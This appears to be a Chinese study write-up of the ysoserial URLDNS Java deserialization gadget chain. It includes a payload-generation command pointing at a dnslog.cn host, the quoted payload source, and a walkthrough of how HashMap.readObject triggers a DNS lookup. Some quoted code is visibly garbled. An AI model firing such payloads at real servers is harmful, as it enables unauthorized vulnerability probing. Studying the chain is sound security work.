URLDNS
ysoserial
首先是关于ysoserial项目，牛逼就完事了。
序列化的过程
1. 首先使用 ysoserial 生成反序列化文件，然后自行编写反序列流程，触发构造链。 
踩坑：不要使用powershell生成，反序列化过程中会报错
2. 反序列化 bin 文件，触发 gadget ： 
3. 触发请求：
4. 然后查看urldns中gadget的生成过程：ysoserial入口文件位于： ysoserial.GeneratePayload ，
URLDNS文件： ysoserial.payloads.URLDNS
java -jar ysoserial-master-d367e379d9-1.jar URLDNS "http://0hymwn.dnslog.cn" > 
urldns.bin
public Object getObject(final String url) throws Exception {
                //Avoid DNS resolution during payload creation
                //Since the field java.net.URL.handler is transient,
it will not be part of the serialized payload.
                URLStreamHandler handler = new SilentURLStreamHandler();
                HashMap ht = new HashMap(); // HashMap that will contain the URL
                URL u = new URL(null, url, handler); // URL to use as the Key
5. 首先创建一个 SilentURLStreamHandler 对象，且 SilentURLStreamHandler 继承自
URLStreamHandler 类，然后重写了 openConnection 和 getHostAddress 两个方法，这一步的作
用留待后面进一步讲解，此处还有一个关于反序列化的知识点。
6. 接着创建一个 hashmap ，用于之后存储。
7. 创建一个 URL 对象，此处需要跟进 URL 类查看类初始化会发生啥。传递三个参数
(null,url,handler)  
                ht.put(u, url); //The value can be anything that is 
Serializable, URL as the key is what triggers the DNS lookup.
                Reflections.setFieldValue(u, "hashCode", -1); // During the put 
above, the URL's hashCode is calculated and cached. This resets that so the next 
time hashCode is called a DNS lookup will be triggered.
                return ht;
        }
        public static void main(final String[] args) throws Exception {
                PayloadRunner.run(URLDNS.class, args);
        }
        /**
         * This instance of URLStreamHandler is used to avoid any DNS 
resolution while creating the URL instance.
         * DNS resolution is used for vulnerability detection. It is important 
not to probe the given URL prior
         * using the serialized object.
         *
         * Potential false negative:
         * If the DNS name is resolved first from the tester computer, the 
targeted server might get a cache hit on the
         * second resolution.
         */
        static class SilentURLStreamHandler extends URLStreamHandler {
                protected URLConnection openConnection(URL u) throws IOException 
{
                        return null;
                }
                protected synchronized InetAddress getHostAddress(URL u) {
                        return null;
                }
        }
8. 通过初始化，会调用handler的parseURL方法对传入的url进行解析，最后获取到host，protocol
等等信息。
9. 之后数据存储，这一步将创建的 URL 对象 u 作为键， url 作为值存入 hashmap 当中。
10. 利用反射将 URL 对象的 hashcode 值设置为-1，此处为什么要重新赋值，之后再说。
11. 返回这个 hashmap 对象，并对这个 hashmap 对象进行序列化。
反序列化的过程
1. 因为序列化的是 hashmap 对象，所以此处反序列化首先跟踪进入 hashmap 类的 readObject 方法
    private void readObject(java.io.ObjectInputStream s)
        throws IOException, ClassNotFoundException {
        // Read in the threshold (ignored), loadfactor, and any hidden stuff
在第1402和1404行会将 hashmap 中的键和值都取出来反序列化，还原成原始状态。此处的 key 根据之
前 payload 生成的过程，是 URL 的对象， value 是我们传入的 url 。
2. 之后调用 putval 方法重新将键值存入 hashmap 当中。此处，需要计算 key 值的 hash ，所以我们
跟进 hash 函数。 
可以看到此处需要调用对象 key 当中的 hashcode 方法，而这个 key 跟进上一步的解释是创建的
URL 类的一个对象，所以此处调用的就是 URL 类中的 hashCode 方法。
        s.defaultReadObject();
        reinitialize();
        if (loadFactor  0) { // (if zero, use defaults)
            // Size the table using given load factor only if within
            // range of 0.25...4.0
            float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f);
            float fc = (float)mappings / lf + 1.0f;
            int cap = ((fc = MAXIMUM_CAPACITY) ?
                       MAXIMUM_CAPACITY :
                       tableSizeFor((int)fc));
            float ft = (float)cap * lf;
            threshold = ((cap [] tab = (Node[])new Node[cap];
            table = tab;
            // Read the keys and values, and put the mappings in the HashMap
            for (int i = 0; i  hashmap.hash() -
> URL.hashCode() -> URLStreamHandler.hashCode() -
> URLStreamHandler.getHostAddress()
几处踩坑和知识点
1. 第一个为什么生成序列化流的时候要通过反射将 hashCode 的值设为-1。因为 hashmap 在进行数据
存储的过程中调用 putVal 函数，这其中会进行 hashcode 的计算，经过计算之后原本初始化的-1
会变成计算后的值，所以要通过反射再次修改值。
在序列化流的生成位置，也可以通过反射来查看hashCode中间的变化。 
2. 第二个就是关于为什么要重写那两个方法的问题，以及被transient修饰的属性不参与反序列化。 
此处关于transient关键字，做一个简单的实验就可以知道： 
创建一个Person类，然后定义一个transient关键字修饰的obj属性。 
之后对Person类进行序列化和反序列化，查看结果： 
此处可以看到obj对象没有被序列化，并且此处还有一个点就是反序列化的过程中并不会再触发构
造函数。
在一个就是关于函数重写的问题，还是和hashmap存数据的时候会计算一次hashcode有关，在
hashmap存数据的时候会计算URL对象的hashcode值，也就是会调用URL.hashCode()方法，这样
的化按照之前的分析就会发起一次DNS请求，所以为了屏蔽这个请求我们将用于发起请求的两个关
键方法重写，跳过请求部分。
3. 这个构造链的利用在之后CC6的链中也有相同的部分，通过计算 hashcode 触发构造链。